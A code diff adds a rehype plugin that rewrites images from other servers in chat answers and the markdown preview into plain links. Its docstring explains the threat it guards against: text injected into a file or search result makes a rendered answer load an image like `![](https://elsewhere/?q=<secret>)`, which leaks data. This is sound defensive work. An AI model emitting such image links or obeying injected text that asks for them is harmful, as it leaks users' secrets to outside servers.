@@ -151,6 +151,48 @@ export function workspaceNoteImages(isNote: (href: string) => boolean) {
   return (root: HastNode) => visit(root);
 }
 
+// Any origin will do: only whether a src stays on it matters.
+const HERE = "https://app.invalid";
+
+/**
+ * Whether an image's address stays on this app: a path here, or inline image
+ * data. Anything else would make the reader's browser call another server as
+ * soon as the text is shown (issue #291), which is how text injected into a
+ * file or a search result gets data out: `![](https://elsewhere/?q=<secret>)`.
+ * The URL parser decides, so `//host`, `/\\host` and odd schemes don't slip by.
+ */
+export function isLocalImage(src: string): boolean {
+  const address = src.trim();
+  if (/^data:image\//i.test(address)) return true;
+  // No other scheme at all: "https:host/x" is a path on an https page and another site on an http one.
+  if (/^[a-z][a-z\d+.-]*:/i.test(address)) return false;
+  try {
+    return new URL(address, HERE).origin === HERE;
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * Rehype plugin for chat answers and the markdown preview, placed before
+ * Streamdown's harden step: an image from another server becomes a link the
+ * reader may choose to open, instead of a request made on sight.
+ */
+export function localImagesOnly() {
+  function visit(node: HastNode) {
+    const src = node.tagName === "img" ? node.properties?.src : undefined;
+    if (typeof src === "string" && !isLocalImage(src)) {
+      const alt = node.properties?.alt;
+      node.tagName = "a";
+      node.properties = { href: src };
+      node.children = [{ type: "text", value: typeof alt === "string" && alt ? `${alt} (image)` : src }];
+      return;
+    }
+    node.children?.forEach(visit);
+  }
+  return (root: HastNode) => visit(root);
+}
+
 /** Block elements a reference can land on in the markdown preview. */
 const LINE_TAGS = new Set(["p", "h1", "h2", "h3", "h4", "h5", "h6", "li", "tr", "hr", "pre"]);
 
